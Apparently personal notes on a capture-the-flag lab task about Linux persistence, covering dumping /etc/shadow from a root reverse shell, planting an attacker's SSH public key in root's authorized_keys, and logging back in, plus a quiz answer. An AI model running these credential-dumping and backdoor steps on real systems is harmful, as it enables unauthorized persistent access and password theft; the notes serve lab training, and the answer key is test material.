Now that we have gained a decent foothold onto the network and have a stable shell, we can worry about setting up persistence so that we don't lose our foothold and gain our foothold again if the machine is reset or our shell gets terminated. There are many methods for persistence outlined below are a few examples.  

- LD_PRELOAD
- Backdoored binaries
- PAM backdoor
- SSH keys
- Malicious services
- Cronjob
- Credential harvesting

In this room, we will be focusing on credential harvesting specifically from the shadow file and how to crack passwords offline to gain long-term account access.  

For more information about persistence techniques check out MITRE ATT&CK [TA0003](https://attack.mitre.org/tactics/TA0003/).  

---
## Dumping the shadow file

To begin with our persistence adventures, we will be focusing on dumping the shadow file on a Linux server. The shadow file is located in `/etc/shadow` and contains encrypted passwords and related information, including usernames, password change date, expiration, etc. We can use this file to retrieve hashes as an attacker and then attempt to crack the hashes using an offline hash cracking tool like Hashcat or JohntheRipper.  

Since the shadow file is a standard in the Linux kernel to authenticate accounts, you can expect it on every *nix machine you encounter.  

To dump the shadow file is simple; once you have root privileges, you need to read the file, and the machine will output the information in the shadow file. Find an example command below.  

Command used: `cat /etc/shadow`

![[Task 21 - From the Shadows-20240924134929338.webp]]


---

## Adding an SSH key

We can add our own SSH key onto the box, allowing direct SSH into the box.

To do this, we first need to create a SSH keypair on the attacking machine, which can be done using ssh keygen:

`ssh-keygen -t rsa`

This creates a private and public keypair which gets saved by default into `/home/<user>/.ssh/` 

The idea behind this, is you put your public key onto machines you want to connect into, and keep your private key a secret on your machine only. You should never give out your private key!

Usually you would add a password, but because this is just for this, there is no need.

Now you have the files, you can put the public key on the server. The keys are stored within `/root/.ssh/authorized_keys`.


---

# Your job

## Dumping the shadow file

- Get the `passwd` and `shadow` files.
	On the root reverse shell run:
	`cat passwd`
	![[Task 21 - From the Shadows-20240926144242939.webp]]

## Adding an SSH key

- On your attacking machine run:
	`cd ~./ssh`
	`ssh-keygen -t rsa`
	`cat id_rsa.pub`
	- Copy the output.
- On the victim machine shell run:
	root@a0d4f41db73c:/# `cd ~/.ssh`
	
	root@a0d4f41db73c:~/.ssh# `echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx7lmicrpuUEZL2lD6kzvFfEOwwTq9y1WTXX60Mk/WtYWF7x17+XI+GaiqcDHivLOvjQVfW//Jl4u29LupiVVTMkOdwbmsRK7be4rxTAn/HSCrlOEGktLsGlgciudyY9UTzJn09IFx0aTfFNZetl5OiM28UuTsJ+ZZx92O5E2N6Z0wr/tCJUyx/Z7xmKOaW30+/2HeMHId2W9XUPTtp27Gf5WRdenLzpbnJz2SUfrHFaVjJVjO3EC7jX7SHjRrDhjVwgVIeOrMYf2/o2ljVHDN9sWgZAFeaWDsbMYWazckrKBjVAAmPgdjaYZq0N0Qc7jUyLFt1OF8KQfnD1jAJDOtqjZNLR+qQmJsOQLmxD7SePgfE15n3UZCVL4/Da37Vc8izBTTmxmOZKCvqVC+AJEBfSwpp0YfdYTnviFqycqT9mdUQ4QUirteYmOf6lezsyHzbQBk+CKka9so8GZahcB26LyHBymU0viDS9T0Gv1npXLqVKPgecGRKik6h32y9+U= kali@kali" > authorized_keys`

## SSH to the victim machine with a key

On the attacking machine run:
`ssh root@admin.holo.live -i id_rsa`

![[Task 21 - From the Shadows-20241007143744991.webp]]


> [!INFO]
You can SSH whenever you like to  L-SRV01.


---

## Answer the questions

> [!question]
> What non-default user can we find in the shadow file on L-SRV01?
> `linux_admin`

**Next step:** [[Task 22 - Crack all the Things]]

